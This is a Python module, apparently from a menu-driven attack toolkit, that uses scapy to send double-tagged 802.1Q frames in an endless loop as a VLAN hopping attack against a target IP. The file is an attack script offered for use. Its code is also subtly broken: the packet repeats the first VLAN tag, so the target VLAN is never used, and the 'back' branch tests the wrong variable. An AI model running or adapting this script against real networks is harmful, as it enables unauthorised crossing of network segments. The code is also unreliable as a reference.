import time
from scapy.all import *
from Modules import intro
from Modules import intro
class Attack_Vlan:
    def __init__(self):      
        print("""
            1 - Attack 
            99 - Back
            """)

        self.Number = str(input("[?]>>"))
        if self.Number == str(1) or "Attack" in self.Number or "attack" in self.Number : 
                
            self.interface = str(input("Enter the Interface>>"))
            self.your_VLAN = int(input("Enter the Vlan Your>>"))
            self.target_vlan = int(input("Enter the Vlan Attack>>"))
            self.Target_ip_icmp = str(input("Enter the Target ip>>"))


            self.ether = Ether()
            self.dot1q1 = Dot1Q(vlan=self.your_VLAN)
            self.dot1q2 = Dot1Q(vlan=self.target_vlan)
            self.ip = IP(dst=self.Target_ip_icmp)
            self.icmp = ICMP()

            self.packet = self.ether/self.dot1q1/self.dot1q1/self.ip/self.icmp
            try :
                    
                while True :
                    
                    print("Attack Vlan Hopping")
                    sendp(self.packet, iface=self.interface)
                    time.sleep(5)
            except :
                
                pass
            
        elif self.Number == str(99) or "back" in intro.Number :
            intro.main()



